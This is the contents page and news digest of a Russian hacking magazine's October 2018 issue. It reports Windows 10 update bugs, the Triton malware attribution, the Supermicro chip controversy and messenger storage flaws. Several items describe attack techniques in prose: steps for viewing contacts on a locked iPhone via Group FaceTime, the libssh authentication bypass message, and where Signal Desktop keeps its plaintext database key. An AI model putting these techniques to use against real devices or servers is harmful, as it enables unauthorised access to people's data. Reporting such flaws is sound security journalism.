
                                                   Октябрь 2018
            № 235
CONTENTS

    MEGANews
  Всё новое за последний месяц

    Дайджест Android
  Лучшие гайды, библиотеки и инструмен ты месяца

    Возрожде ние эксплоит‐китов
  15 самых убойных паков экспло итов всех времен

    Экс плуатируем Open Redirect
  Как откры тый редирект используют для фишин га и DDoS

    X‐иссле дование: NVR и DVR
  Разбира ем уязвимости в видеорегистра торах, которые все никак не пофиксят

    Целенаправленная социаль ная инженерия
  Нестандартные тех ники введения в заблуждение

    Экс плоиты в десятку
  Обзор самых интерес ных докладов с мировых ИБ‐кон ферен ций

    Зах ват Ваканды
  Ло маем вир туальную машину с VulnHub

    Фун дамен тальные осно вы хакерства
  Про верка аутен тичнос ти и базовый взлом защиты

   Дырявая логика
  Эксплуатируем новые уязвимости в Oracle WebLogic

    Прятки с Windows 10
  Тестируем программы для отключения слежки и повышения при ватности

    WPA3
  Смот рим, что нового в следующем стан дарте безопасности Wi‐Fi и изучаем прошлые

    Алекса, скажи Кор тане, пусть поищет в Гугле
  Ка кие быва ют умные колон ки, как они работа ют и какую информацию о нас собирают

    Под клю чить все!
  Делаем экстремально дешевый хаб для устройств ZigBee и Z‐Wave

   Малина с сахаром
  Рецепт не совсем обыч ного мультимедиа центра из Raspberry Pi

   WWW
  Интересные веб‐сервисы

    Стоп‐спам для «Телеграма»
  Как написать и задеплоить бота на TypeScript за полчаса

    Жесткая закал ка Linux
  Под бира ем инс тру мен ты для комплексного аудита безопасности

    Кибер нетический оркестр
  Оркес тра ция кон тей неров Docker с приложениями .NET Core в обла ке

    Приз наки «Опе ры»
  Йон фон Теч нер об идеоло гии бра узера Vivaldi

    Я у мамы инже нер!
  Как перес тать бояться паяльника и начать тво рить

     Тит ры
  Кто дела ет этот журнал

                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





КУЧА БАГОВ
В WINDOWS 10
Октябрьское обновление для Windows 10 (1809), похоже, войдет в историю
как одно из наиболее проб лемных. После его установки у пользователей про‐
являлись самые разные баги.


Удаление файлов
Сначала выяснилось, что в некоторых случаях апдейт удаляет файлы из папок
с документами и картинка ми. О проблеме мас сово сообщали сами поль‐
зователи в социальных сетях на форумах поддержки Microsoft.
  Пострадавшие попытались самос тоятельно разобраться в причинах про‐
исходящего. Так, один пользователь сооб щил в  Twitter, что если файлы
отсутствуют в облачном хра нилище OneDrive, но есть на диске, то с обновле‐
нием Windows они будут потеряны. Новая версия ОС попросту перезаписы‐
вает файлы, если они хра нят ся в пользовательском каталоге  (C:\Users\
user\Documents\).
  В итоге всем было рекомендовано проверять наличие иконки OneDrive
рядом со значком каталога, а если ее нет, срочно делать бэкап или хотя бы
копировать данные в другой каталог, пока Windows не начала обновляться.
По признанию Microsoft, примерно в 0,01% случаев пос ле установки апдей‐
та 1809 в пользовательском катало ге users\User действительно сти рались
файлы.


Не совместимость драйверов
Вскоре стало ясно, что уда ление файлов было далеко не единственной проб‐
лемой. После того как инженеры Microsoft отменили апдейт и забрали его
на «доработку», новую версию обновления выложили для учас тников прог‐
раммы Microsoft Insider. Ока залось, что эта версия провоцирует появление
BSOD на компьюте рах и ноутбуках производства HP.
  Их владельцы жаловались, что пос ле обновления ОС демонстрирует
«синий экран смерти» с ошибкой WDF_VIOLATION. Издание Bleeping Comput‐
er сообщило, что у боль шинства пользователей сбой вызывал файл C:\Win‐
dows\System32\drivers\HpqKbFiltr.sys, то есть один из драйверов кла‐
виатуры. Впрочем, нашлись и такие люди,  у которых BSOD появлялся
безо всякого HpqKbFiltr.sys, а просто пос ле установки осеннего обновления.


Отказ аудио
Еще один баг обнаружил Лоуренс Абрамс (Lawrence Abrams), основатель
и владелец уже упомяну того ресурса Bleeping Computer. Он обратил вни‐
мание, что на Reddit, официальных форумах Microsoft и в социальных сетях
множатся сообщения от людей, у которых пос ле октябрьского «вторника
обновлений» пропал звук. Владельцы проблемных систем получали от Win‐
dows 10 лаконичное сообщение «Аудиоус тройство не установлено», при чем
на машине могли исполь зоваться абсо лютно любые аудиодрайверы (Realtek,
Intel и так далее), баг возникал в любом случае.
  Один из сотрудников  Microsoft подтвердил, что компания непродол‐
жительное время распространяла некорректные драй веры (аудиодрайвер In‐
tel) через Windows Update. Как только начали пос тупать жалобы, раздача
проблемного обновления прекратилась. В итоге пользователям, работа‐
ющим на Windows 10 вер сии 1803 и выше, порекомендовали проверить, уста‐
новлен ли в их системе некорректный драйвер, и, если нужно, исправить
проблему.


Проб лема с архивами ZIP
Когда казалось, что хуже стать уже не может, в Windows 10 (1809) нашли
еще один баг, связанный со встроенной в ОС функциональностью и рас‐
паковкой архивов ZIP.
   Так, во время распаковки архива операционная система дол жна спра‐
шивать у пользователя, нужно ли переза писать существующие файлы, если
в указанной директории уже содержится данный контент. Однако вер‐
сия 1809 ничем подоб ным у пользователя не интересовалась. Если попытать‐
ся распаковать архив (или перетащить один из файлов архива в новое место)
туда, где уже существуют те же самые файлы, ОС попросту перезапишет их,
ни о чем не предупреждая.
  Первыми проблему заметили поль зователи Reddit, и, похоже, этот баг
проявляется не у всех. В частности, журналис ты Bleeping Computer сооб‐
щили, что им не удалось вос произвести проблему у себя. К тому же один
из инженеров Microsoft заверил пользователей в Twitter, что баг уже был
устранен в грядущей Windows 10 Build 18234.
  Тем не менее поль зователи Reddit и специалисты Bleeping Computer
советовали пользователям на вся кий случай быть осторожнее при действиях
с архивами.


30 000 000 ПОИС КОВЫХ ЗАПРОСОВ В ДЕНЬ


Популярность поисковика DuckDuckGo продолжает медленно, но верно расти. Разработчики
сообщили, что в этом месяце поисковый сер вис преодолел важную отметку в 30 000 000
поисковых запросов в день.

К отметке 10 000 000 зап росов в день поис ковик шел 7 лет, пос ле чего на дос тижение
20 000 000 запросов потребовалось еще 2 года, а новый рубеж был взят все го через год пос‐
ле этого. Компания с гор достью отмечает, что прирост трафика с каждым годом про должает
ускоряться.





APPLE ПРОТИВ
РЕМОНТА
Инженеры  Apple разработали софтверную блокировку, которая дол жна
положить конец ремонту компь ютеров компании в неавторизованных сер‐
висах. Новые устрой ства будут содержать механизм, который лишит их
работоспособности при попытке неофициаль ного ремонта. Однако этот
механизм пока неактивен.
  В распоряже нии редакции издания Vice Motherboard оказался документ,
который Apple передала в авторизованные сервисы в конце сентября текуще‐
го года. Речь в документе идет о новых компь ютерах Apple с чипом T2,
а именно iMac Pro и MacBook Pro 2018 года.
  Софтверный «замок» может активировать ся при любой попытке ремонта,
вклю чая замену дисплея ноутбука, центральной платы, топкейса (клавиатуры
и тачпада) и панели Touch ID. На iMac Pro блокировка произойдет при замене
флеш‐памяти или материнской платы.
   Чтобы этого избежать, нужно запус тить специаль ную утилиту AST 2 System
Conﬁguration suite, которая будет в рас поряжении официальных сервисов,
и лишь тогда «ремонт будет полностью завершен», говорится в документе.
Эта утилита проверяет, пра виль но ли работает компь ютер, при чем тестирует
не только софт, но и железо: блоки питания, дис плей, опе ративную память,
систему охлаждения. Для ее запус ка нужно обязательно подключиться
к облачному серверу Apple Global Service Exchange (GSX), который тре бует
входа через учет ную запись авто ризо ванного сотрудника.
   Если компьютер «превратился в кирпич» пос ле неавторизованного ремон‐
та, вернуть его к жизни смогут только в официальном Apple Store либо в авто‐
ризованном сервисном центре, где сотрудники запус тят Apple Service Toolkit
2.
   Как выяснили эксперты  iFixit, нововведение пока не вступило в силу.
Исследователи специально приобрели новый Macbook Pro 2018 13″ c тач‐
баром, разобрали и поменяли дисплей, затем обновили ОС до Mojave
и поменяли материн скую плату. Ни одно из этих дей ствий не привело к бло‐
кировке.
  Похожий механизм уже работа ет в пос ледних моделях iPhone: при замене
кнопки «Домой» функция Touch ID не будет работать до тех пор, пока телефон
не пройдет калибровку на так называемой Horizon Machine. Дело в том, что
в последних моделях iPhone кноп ка Touch ID при вязана к чипу A7, так что чип
не «узнает» новую кнопку без специальной настройки.


УЩЕРБ ОТ 14 КИБЕРАТАК НА КРИПТОБИРЖИ СОС ‐
ТАВИЛ 882 МИЛЛИОНА ДОЛЛАРОВ

Эксперты Group‐IB оценили ущерб от целевых атак на крип товалютные биржи в 2017 году
и первые девять месяцев 2018 года. По дан ным экспертов, за этот период были взломаны
как минимум 14 обменников, а общий ущерб от атак сос тавил око ло 882 000 000 долларов.

В 2017 году и первые девять месяцев 2018 года были взломаны 14 бирж, и 5 из них атакованы
северокорейской хакерской группой Lazarus. В том чис ле япон ская биржа Coincheck, потеряв‐
шая 534 000 000.





За последние полтора года северокорейская группа Lazarus атаковала как минимум 5 крип‐
тобирж: Yapizon, Coinis, YouBit, Bithumb, Coincheck.

В большинстве случаев при атаках на крип тобиржи хакеры используют традиционные инс тру‐
менты и схемы, такие как целевой фишинг, социальная инженерия, загрузка вре-
доносных программ, дефейс сайта.

Основной вектор проникновения в кор поративные сети крип тобирж — целевой фишинг, на него
приходится 56% украденных средств.

Крупная фишинговая группировка похищает около 1 000 000 дол ларов в месяц.

В 2017 году было похищено более 10% всех привлеченных инвести ций, а 80% про ектов
не выполнили обязательства перед инвесторами и исчезли пос ле сбо ра средств.





МАЛВАРЬ ИЗ НИИ
Компания FireEye опубликовала детальный отчет, рассказывающий об изу‐
чении вредоноса Triton (он же Trisis), который ата ковал объекты критической
инфраструктуры. По данным New York Times, одна из атак была направлена
на саудовское предприятие нефтехимического профиля, принадлежащее
компании Tasnee. В отчете исследователи FireEye делают вывод, что малварь
каким‐то образом связана с Рос сией и ФГУП «Центральный научно‐иссле‐
довательский институт химии и механики» (ЦНИИХМ).
  Напомню, что Triton был обнаружен в конце 2017 года. Тогда сообщалось,
что малварь исполь зуется для атак на контроллеры систем инструментальной
безопасности Triconex (Triconex Safety Instrumented System) производства
Schneider Electric. Эти решения нуж ны для мониторинга технологических про‐
цессов на предприятиях и безопасного восста новления или завершения
работы оборудования при воз никновении сбо ев и потенциально опасных
ситуаций.
  Специалисты FireEye, Dragos и Symantec писали, что Triton используется
для фактических атак, однако не рас кры вали названия пос традавших орга‐
низаций и стран, где те базиру ются. При этом ана литики FireEye были убеж‐
дены, что за созданием Triton стоят хорошо финансируемые «правитель‐
ственные хакеры», обла дающие всеми необходимыми ресурсами для про‐
ведения подобных атак.
  В новом отче те аналитики FireEye рас сказыва ют о собранных ими уликах,
которые были обнаружены при более детальном изу чении случаев примене‐
ния Triton. И исследователи выражают уверенность, что московский ЦНИИХМ
имеет какое‐то отношение к этим ата кам. Фактически исследователи не свя‐
зывают ЦНИИХМ с самим Triton, но заявляют, что Центральный научно‐иссле‐
довательский институт химии и механики имеет некое отношение к хакерской
группе TEMP.Veles. Именно эта группировка, по мнению FireEye, стоит за соз‐
данием Triton, и ряд других ее инстру ментов (также задействованных во вре‐
мя атак) удалось проследить до рос сийского НИИ.
   Аналитики приводят в отчете следующие аргу менты в поддержку своей
теории:
 • PDB‐путь одного из файлов содержал строку, похожую на уникальный
   псевдоним или имя поль зователя; это имя/псевдоним вывели исследова‐
   телей на неназванного ИБ‐эксперта и бывшего профес сора ЦНИИХМ;
 • вредоносная активность ска неров и мониторов TEMP.Veles при вела к IP‐
   адресу 87.245.143.140, который при надлежит ЦНИИХМ;
 • многие связанные с Triton файлы содержат кириллические име на и дру гие
   артефакты;
 • время создания файлов малвари хорошо соотносится с рабочим вре‐
  менем часового пояса, в котором рас положена Москва;
 • по  мнению   исследователей,  ЦНИИХМ  обладает  достаточными
   институциональными знаниями и персоналом, который мог бы создать Tri‐
   ton и координировать операции TEMP.Veles.





Впрочем, иссле дователи все же пишут, что нель зя сбрасывать со счетов воз‐
можность того, что кто‐то из сот рудников ЦНИИХМ связан с группой TEMP.Ve‐
les и занимался вредонос ной активностью на рабочем мес те без чьего‐либо
ведома.


IBM И RED HAT ОБЪЯВИЛИ О ГРЯДУЩЕМ СЛИЯНИИ
Сумма сделки составит порядка 34 миллиардов дол ларов США, то есть IBM готова зап‐
латить 190 долларов США за одну акцию Red Hat, хотя сейчас капитализация компании оце‐
нивается в 20,5 миллиарда долларов. Слияние уже одобрено руководством обеих компаний.





→«Приобретение Red Hat может изменить правила игры. Это меняет всю ситуацию на рынке
облачных технологий. IBM станет пос тавщиком гибридных облачных сервисов номер один
в мире и предложит компаниям единое открытое облачное решение, способное рас крыть всю
ценность облачных технологий для их бизнеса»,
— гендиректор IBM Джинни Рометти (Ginni Rometty)





ШПИОНСКИЕ ЧИПЫ В
КИТАЙСКОМ ЖЕЛЕЗЕ
В середине октября 2018 года изда ние Bloomberg опубликовало серию ста‐
тей, в которых рассказыва лось о китайских шпионских чипах, которые якобы
встраивают в серверы компании Supermicro пря мо на заводе. По свидетель‐
ствам многочисленных анонимных источников издания, около 30 компаний,
вклю чая Amazon, Apple, ВМС США и ЦРУ, могли использовать серверное
оборудование, модифициро ванное на фабрике производителя в Китае.
  Однако нашлось крайне мало неано нимных источников, готовых подтвер‐
дить выводы Bloomberg. К примеру, в собственных выводах в итоге усомнился
эксперт по аппаратной безопас ности Джо Фитцпатрик, который консуль‐
тировал Bloomberg в расследовании и был одним из немногих названных
источников. Фитцпатрик нашел в вышедшей статье свои слова (в которых он
не слишком уверен, поскольку многие вещи попросту предполагал), которые,
по сообщению журналистов, подтвердили семнадцать неназванных источни‐
ков. Но в данном позже интервью эксперт усомнился в существовании всех
этих источников в принципе.
  При этом большинство якобы пос тра давших компаний и вовсе сообщали,
что никакой проб лемы с китайскими «закладка ми» в железе не существует и,
следовательно, их все это не касается. Той же версии придерживаются
и представители Supermicro, которые заявили, что им неизвестно о наличии
каких‐либо неоригинальных компонентов в их про дукции и их клиенты никогда
не сообщали о подоб ных находках.
   Стоит отдельно заметить, что предста вители Amazon и Apple тоже отри‐
цают, что их серверы были скомпрометированы. Более того, ответные заяв‐
ления компаний изобилу ют деталями, где пункт за пунктом разбирается
статья Bloomberg и неправота журналис тов.
  Высказался о происходящем и глава Apple. Тим Кук обозначил свой взгляд
на ситуацию в интервью изда нию Buzzfeed News. «Я счи таю, им стоит отоз‐
вать этот материал. В их пуб ликации нет правды об Apple. Им стоит поступить
правильно», — заявил Кук. Кроме того, CEO Apple рассказал, что был плотно
вовлечен в эту историю с самого ее начала:



      «Я лич но говорил с репор терами Bloomberg и Брю сом Сьюэллом,
      который тогда был гла вой нашего юридичес кого отде ла. Мы с ними
      четко обоз начили, что ничего подобного не было, мы отве тили на все
      их воп росы. Каждый раз, когда они связыва лись с нами, история
      менялась, и каждый раз наши рас сле дова ния не приносили никаких
      результатов».

Говоря о «расследованиях», Кук пояс нил, что специалисты Apple долго
и упорно искали признаки компрометации, хотя репортеры Bloomberg не пре‐
доставляли компании никакой конкретики о том, где именно нужно искать
вредоносные чипы.



     «Мы  перевер нули  ком панию  вверх  дном.  Email-поис ки,  записи
      дата‑центров, финансовые данные, информа ция о пос тавках. Мы кри-
     мина лис тичес ки проверили ком панию и копали очень глу боко, но каж-
     дый раз приходили к одному и тому же выводу: этого не было;
      это неп равда».

Стоит сказать, что вскоре после публикации этих слов Тима Кука пред ста‐
вители Bloomberg сооб щили, что официально отзывать свои публикации они
не намерены.


96% САЙТОВ НА WORDPRESS РАБОТАЮТ НА АКТУАЛЬНЫХ
ВЕРСИЯХ ДВИЖКА

В США состоялась конференция DerbyCon, где разработчики популярнейшей CMS WordPress
рассказали немало интересного и подвели своеобразный промежуточный итог своей работы
по повышению безопасности платформы.


По их словам, одним из переломных моментов в вопросах защиты пользовате лей стало внед‐
рение механизма автоматического обновления в WordPress 3.7. К тому же о необходимости
обновлений администраторам теперь напоминает даже Google. В результате на сегодняшний
день 96% сайтов на WordPress используют четвертую версию платформы.





                                     Продолжение статьи →
← Начало статьи





 ОБХОД БЛОКИРОВКИ
 В IOS
  В этом месяце испанский ИБ‐специалист Хосе Родригес (Jose Rodriguez)
  продемонстрировал публике сра зу три раз ных способа обхода блокировки
  экрана в iOS. Стоит сказать, что до этого Родригес неоднократно обнаружи‐
  вал в мобильной ОС Apple ана логичные недочеты.
    Первый способ, обнаруженный исследова телем, позволял прос матривать
  адресную книгу и все фотографии на устройстве пользовате ля. Родригес
  воспользовался  возможностью  акти виро вать   Siri  с  заблокированного
  телефона и скомбинировал  это  с новой функцией  VoiceOver (режим
  для людей с дефектами зрения, в котором телефон при нажатии зачитывает
   вслух отображаемую на экра не информа цию). В итоге Родригес умудрился
  заставить телефон показывать контакты из адресной книги и фото из «Фотоп‐
   ленки».
     Второй способ также полагался на использование VoiceOver, но на этот
  раз специалист зло употребил опцией Answer by SMS, то есть отве том на зво‐
  нок с помощью тексто вого сообщения. В результате потенциальный зло‐
  умышленник получал воз можность не только просматривать любые изоб‐
  ражения на телефоне жертвы, но и пересы лать их себе.
     Третий способ обхода экрана блокировки получился совсем обидным
  для инженеров компании Apple. Дело в том, что Родригес обнаружил новый
   баг спустя все го несколь ко часов после релиза новой iOS 12.1.
    На этот раз специалист вос пользовался представленной в новой версии
  ОС функцией Group FaceTime, которая позволя ет организовывать кол лектив‐
  ные видеочаты для групп до 32 человек. Этот метод работает без прив‐
  лечения к делу Siri и не использует функцию VoiceOver. Впрочем, как и в пер‐
  вых двух случаях, злоумышленнику по‐прежнему нужно иметь физичес кий
  доступ к устройству.
     Атакующему нужно поз вонить на iPhone жертвы с дру гого iPhone (если
  номер неизвестен хакеру, его мож но спросить у ассистента Siri). Затем, когда
  на звонок ответят, нужно инициировать видеочат FaceTime, обратиться
   к меню в правом нижнем углу и выб рать опцию «Добавить человека» (Add Per‐
   son). После нужно нажать на иконку + и получить дос туп к полному списку кон‐
   тактов на целевом iPhone. Вот и все, блокировка обманута, можно прос‐
  мотреть детальную информацию о каждом контакте.


 ИЗЛЮБЛЕННЫЕ БРЕНДЫ ФИШЕРОВ: MICROSOFT, PAYPAL,
  NETFLIX
   Специалисты компании Vade Secure провели исследование и выявили, какие брен ды чаще ста‐
   новятся «ширмой» для злоумышленников и используются во вре мя про веде ния фишинговых
   атак.

  В третьем квартале 2018 года количество фишин говых атак возросло на 20,4%.

   Чаще всего фишеры используют брен ды Microsoft, PayPal, Netflix, Bank of America
   и Wells Fargo.





   Связанный с Microsoft фишинг — это попытки выманить у пользовате лей учетные данные
   от Office 365, One Drive и Azure.

   Большинство фишинговых рассылок приходится на втор ник и четверг, тогда как связанные
   с Netﬂix атаки более активны в воскресенье, ког да пользователи отдыхают дома.





 GOOGLE+
 ЗАКРЫВАЕТСЯ
  Компания Google объявила о скором закрытии социальной сети Google+
   в силу низкой вовлеченности пользователей, а также из‐за бага, который
  открывал возможность утечки личной информации для 500 тысяч аккаунтов.
  И хотя нет свидетельств того, что этим багом действительно кто‐то восполь‐
  зовал ся, компания приняла решение пос тепенно прекратить работу Google+
  для широкой аудитории. Закрытие социальной сети будет длиться десять
  месяцев и должно завершиться в середине 2019 года.
    В ходе аудита кода (проект «Стробоскоп» — Project Strobe) компания
  обнаружила в одном из API баг, который мог при вес ти к утечке личных данных
  из аккаунтов Google+. Ошибка поз воляла дру гим приложениям, установ‐
  ленным у пользователя, получать дос туп к API Google+ для чте ния непуб‐
  личной информации о друзь ях жертвы (такой как имя, воз раст, пол, адрес
   электронной почты и место работы). Никакие другие данные, которые поль‐
  зователь передавал в Google+, вклю чая записи, сообщения, содержимое G
   Suite (Google Apps for Work) и телефонные номера, багу под вержены не были.
     Известно,  что  уязвимость  существо вала  в  коде  с  2015  года
  по март 2018 года, после чего ее наконец обна ружи ли и исправили. Посколь‐
   ку Google хранит логи API для Google+ только две недели, оказалось невоз‐
  можно опре делить, успел ли кто‐либо вос поль зоваться багом за указанный
  период. Примечательно, что предста вители Google приняли решение не раз‐
   глашать информацию о проблеме вообще.
     Вторая причина для закрытия Google+ — непопулярность сервиса у поль‐
  зователей, предмет многочисленных шуток. В официальном заявлении ком‐
  пании упоминается, что, нес мотря на все усилия, которые разработчики зат‐
  рачивают на поддержание социальной сети, Google+ не пользуется прак‐
   тически никто, кроме сотрудников самой Google, а вовлеченность поль‐
  зователей очень низка: 90% сессий длятся менее пяти секунд.
    В  итоге Google+  будет пос тепенно  закрыта  для широкой  публики
  и переведена во внутреннее пользование в течение следующих десяти
  месяцев.


 ВИТАЛИК БУТЕРИН СОЖАЛЕЕТ О СМАРТ‐КОН ТРАКТАХ
   Во время дискуссии в Twitter разработчик и основатель Ethereum Виталик Бутерин признался,
   что сожалеет об использовании термина «смарт‐контракт».





  →«Честно говоря, сейчас я немного жалею о том, что мы стали использовать термин
   „смарт‐контракты“. Мне стоило назвать их как‐нибудь более скучно и технически, воз можно,
   подошло бы что‐то вроде „устойчивых скриптов“»,
  — Виталик Бутерин





 УГРОЗА ОТ LIBSSH
  В библиоте ке libssh, популярном решении для поддержки Secure Shell (SSH)
   аутентификации, найдена уяз вимость CVE‐2018‐10933. Фактически баг поз‐
  воляет атакующему обойти аутентифика цию и получить дос туп к уязвимому
  серверу со включенной SSH‐аутентифика цией, не вводя пароль. Проблему
  обнаружили специалисты NCC Group, она появилась в коде libssh с релизом
  версии 0.6.0 в 2014 году. Уязвимос ти были подвержены версии libssh вплоть
  до новых 0.7.6 и 0.8.4, выпущен ных в октябре 2018 года.
     Эксплуатация проб лемы крайне проста: нужно отправить SSH‐серверу
  сообщение  SSH2_MSG_USERAUTH_SUCCESS  вместо  ожидаемого  им
  SSH2_MSG_USERAUTH_REQUEST. Из‐за бага сервер, получивший такое
  сообщение, просто поверит ата кующему, что тот залогинен и верификация
  не нужна. Сервер соч тет, что аутентификация прошла успешно, в итоге пре‐
  доставив злоумышленнику доступ.
    Сразу после публикации данных о проблеме ИБ‐спе циалис ты заметили,
   что  поисковик Shodan обна руживает  порядка 6000  уязвимых  систем.
  Отсортировав результаты поиска и добавив к запросу дефол тный SSH‐порт,
  исследователи  все  равно  получали  длинный  список  более  чем
  из 3000 машин.





  Но другие спе циалисты поспешили успокоить: поисковик не видит разницы
  между версиями libssh, плюс нуж но учи тывать, что уяз вимость срабаты вает
  лишь в приложе ниях, работающих в режиме сервера, а это встречается не так
  уж часто.
     Также успокоили сооб щество и разработчики GitHub, ведь GitHub тоже
  использует libssh, и под угрозой, в час тности, мог оказаться GitHub Enterprise.
  Как оказалось, здесь применя ется кас томная имплементация библиотеки,
  поэтому проблема CVE‐2018‐10933 никогда не представляла опас ности
  для GitHub.
    В итоге по состоянию на конец октября бюллетени безопасности, пос‐
  вященные этой проб леме, выпус тили многие крупные участники индустрии,
  вклю чая разработчиков Cisco, Debian, SUSE, Ubuntu, Arch Linux, Dell, F5 Net‐
   works. Решения некото рых производителей ока зались уяз вимы.
    Дело дополнительно осложняется тем, что в Сети уже появились сканеры
  для обнаружения бага, а также многочисленные эксплоиты. К при меру, раз‐
  работчики фирмы Leap Security опубликова ли Python‐скрипт, который может
  использоваться для поиска уязвимых устройств. Proof‐of‐concept эксплоиты
  для уязвимости и вовсе множатся как грибы после дождя (1, 2, 3, 4).


  УТЕЧКА ДАННЫХ 420 000 СОТ РУДНИКОВ СБЕРБАНКА


   Издание «Коммерсант» обнаружило, что в открытом дос тупе была опубликована информация
   об именах и email‐адресах сотрудников Сбербанка, а также их логины для вхо да в ОС, которые
   в большинстве случаев совпадают с адресами почты. Текстовый файл размером 47 Мбайт
   содержал данные примерно 421 000 сотрудников, был выложен на форуме phreaker.pro
   и более недоступен публично.

   Так как в настоящее время в группе Сбербанка работают око ло 300 000 человек, можно пред‐
   положить, что в базе содержались данные и о некоторых уволенных сотрудниках. В пресс‐служ‐
   бе Сбербанка факт утечки подтвердили, назвав ее публикацией части адресной кни ги, которая
   доступна всем сотрудникам. В банке заверили, что эти дан ные «не представляют никакой угро‐
   зы автоматизированным системам и клиентам».





 НЕ СЛИШКОМ
 ЗАЩИЩЕННЫЕ
 МЕССЕНДЖЕРЫ
  В этом месяце ИБ‐специалис ты выявили сра зу нес колько проблем в таких
  мессенджерах, как Signal и Telegram, которые всегда подавались с упором
  на безопасность и приватность пользователей.


  Не зашифрован ные сооб щения в Signal
  ИБ‐специалист Мэтью Сюиш (Matt Suiche) обнаружил, что мессенджер Signal
  некорректно осуществляет апгрейд от рас ширения для Chrome до пол ноцен‐
  ного десктопного клиента. Дело в том, что во время этой процедуры сооб‐
  щения пользовате ля экспортируются в незащищенные текстовые файлы.
    В ходе апгрейда расширения Signal для Chrome до Signal Desktop поль‐
  зователя просят выбрать место, куда будет сохранена информация о сооб‐
  щениях (текст и вложения), чтобы затем импортировать ее в новую версию
  мессенджера.
    Сюиш заметил, что сооб щения попросту сохраняются в файле messages.j‐
   son, без шифрования. В Twitter специалист пишет, что «это просто безумие»,
  и сообщает, что уже отпра вил разработ чикам мессендже ра баг‐репорт.





  Хотя сам исследователь обна ружил опас ный баг только в macOS, когда
  обновлял  свой  Signal,  журналис ты  Bleeping  Computer  заметили,  что
  при переходе с расширения для бра узера на десктопный клиент такая же
  проблема проявляется и в Linux Mint. Хуже того, незашифрованные сооб‐
  щения в обоих случаях остаются на диске даже пос ле завершения апгрейда,
  и удалять их придется вручную.


  Ключи для дешифровки в Signal
  Еще одну проблему в Signal Desktop выявил ИБ‐специалист Натаниэль Сёчи
   (Nathaniel Suchy).
    Дело в том, что во время уста новки Signal Desktop создается зашифрован‐
  ная БД SQLite  (db.sqlite), где хранятся сооб щения пользователя. Ключ
  шифрования  от  этой БД  генерируется мес сенджером  автоматически,
  без взаимодействия с пользователем. Данный ключ тре буется Signal Desktop
  каждый раз, когда нужно открыть базу. И, как выяснил эксперт, он хранится
  локально, в открытом виде: на ПК — в фай ле %AppData%\Signal\config.
  json, на Mac — в ~/Library/Application Support/Signal/config.json.
     Если открыть файл conﬁg.json даже с помощью обычного блокнота, можно
  обнаружить следующее:





  Сёчи поясняет, что вся переписка пользователя в итоге может оказаться
   в руках любой третьей стороны,  у которой есть доступ  к компьютеру.
  При этом исследователь убежден, что в теории проблему легко исправить:
  достаточно просто попросить пользователя ввести пароль и использовать
  его для клю ча шифрования.


  Не зашифрован ные сооб щения в Telegram
  Обнаружив уязвимость в Signal, Сёчи решил также проверить безопас ность
  десктопного клиента Telegram и нашел в нем очень похожую проблему. Как и
   Signal, Telegram Desktop хранит чаты пользователя в локальной БД, и к ним
  тоже можно получить доступ, пос кольку они никак не защищены.


                                        Продолжение статьи →
← Начало статьи





  Сёчи объясняет, что прочитать содержимое SQLite‐базы мессенджера может
  быть немного сложно (см. иллюс тра ции ниже), одна ко база не зашифрована.
  Кроме того, в БД можно обнаружить имена и номера телефонов, свя занные
   друг с другом. И наконец, самое скверное — по сло вам иссле дователя, в той
  же незащищенной базе оседают и переговоры из «секретных чатов».





  Похожая ситуация наблюда ется и с медиафай лами. Сёчи пишет, что дос‐
   таточно было просто поменять рас ширение файла, и картинки стало воз‐
  можно просматривать.
     Хотя исследователю не удалось связаться с разработчиками Telegram,
  вскоре  после  публикации информа ции о  проблеме  в  русскоязычном
   Telegram‐канале Павла Дурова появилось опровержение слов исследова‐
   теля. Дуров утверждает, что находку Сёчи нель зя считать вообще уяз‐
  вимостью, раз эксплуата ция бага предполага ет, что прес тупник уже имеет
  доступ к компьютеру жертвы.





 ЭВОЛЮЦИЯ USB‐УГРОЗ
   Специалисты «Лаборатории Касперского» представили обзор текущей картины киберугроз,
   распространяемых через съемные носители. Статис тика показала, что в целом количес тво вре‐
   доносного ПО, обнаруженного на съемных носителях (а затем и в корневых каталогах на компь‐
   ютере), а  также количество зараженных пользователей пос тепенно снижается, начиная
   с 2014 года.


   USB‐устройства и другие съемные носители используются для рас пространения ПО для май‐
   нинга криптовалют как минимум с 2015 года.

   Некоторая малварь, обнаружен ная в 2018 году, попала на компьюте ры жертв нес колько лет
  назад. Это свидетельствует о длительном заражении, которое, вероятно, негатив но вли яло
   на производительность устройств.





       Количество уникаль ных пользователей (в мил лионах), на компьютерах которых было обнаруже но
                     вредоносное ПО, распространяющееся через съем ные носители

  В 2018 году каждый 10-й пользователь, пострадавший от малвари, передаваемой через съем‐
   ные носители, был жертвой майнера Trojan.Win64.Miner.all.

   Процент обнаружений популярного Trojan.Win64.Miner.all ежегодно растет при мерно на 1/6.

   Эксплоит для CVE-2010-2568 (Stuxnet) остается одним из десяти эксплоитов, наиболее
   активно распространяющихся через съемные носители.


   USB‐зловреды наиболее распространены на развивающихся рынках: больше всего страдают
  Азия, Африка и Южная Америка, но отдельные атаки были зафик сированы в Европе и Се-
   верной Америке.





 ГРЯДЕТ НОВЫЙ
 WINAMP
  Многие наверняка хорошо помнят без преувеличения легендарный меди‐
  аплеер Winamp, который стоял практичес ки на каж дом компьютере в конце
  девяностых  и  начале  нулевых.  Увы,  последние  годы  нельзя  назвать
  сколь‐нибудь успешными для медиаплеера, который не обновлял ся с 2013‐го
   и, по сути, считался «мертвым».
    Напомню,   что  компанию   Nullsoft,  исходно  соз давшую  Winamp,
  еще в 1999 году приобрела AOL, которая и поддерживала плеер на протяже‐
  нии долгих лет. Затем, в 2013 году, раз работку программы, уже растерявшей
  немалую долю своей популярности, решили прекратить, сайт Winamp.com
   закрылся, а права на Winamp в 2014 году выкупи ла бельгийская компания Ra‐
  dionomy Group, занимающаяся интернет‐радиовещанием. С тех пор никаких
  новостей о медиаплеере не пос тупало.
    В середине октября представители Radionomy Group сделали неожидан‐
  ное заявление: в 2019 году Winamp преобра зится, станет лучше и вернется
   в строй. Разработчики намерены сделать Winamp универсальным решением
  для прослушивания всего — подкастов, радио, плей‐лис тов и так далее.



        «Вы сможете слу шать MP3, которые есть у вас дома, но так же смо-
        жете  пользоваться  обла ком,  под каста ми,  стриминговым  радио
        и  плей‑лис тами. Людям  нужен  единый  опыт,  и  я  считаю,  что
        Winamp — иде альный пле ер для всех. Мы хотим, чтобы люди поль-
         зовались им на  всех  своих  устройствах», — рас ска зал изда нию
         TechCrunch гла ва Radionomy Group Алек сандр Сабунджан (Alexandre
          Saboundjian).

